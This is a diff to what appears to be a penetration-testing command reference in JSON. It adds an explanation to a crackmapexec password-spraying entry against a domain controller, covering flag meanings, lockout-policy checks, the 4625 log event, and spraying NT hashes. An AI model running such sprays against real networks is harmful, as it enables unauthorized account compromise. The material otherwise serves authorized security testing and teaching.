@@ -111,5 +111,6 @@
       "label": "Spray one password across all users",
       "command": "crackmapexec smb <dc_ip> -u <userlist> -p '<Season2024>' | grep +"
     }
-  ]
+  ],
+  "explain": "Sprays one password against many domain users over SMB:\n  crackmapexec smb <dc_ip>  authenticate to the DC\n  -u <userlist>            try each username in this file\n  -p <password>            the single password sprayed to all of them\n  | grep +                 show only valid pairs\nCheck the lockout policy first (--pass-pol) - each failure logs Event 4625. Pwn3d! marks local admin; -H <nt_hash> sprays a hash instead."
 }
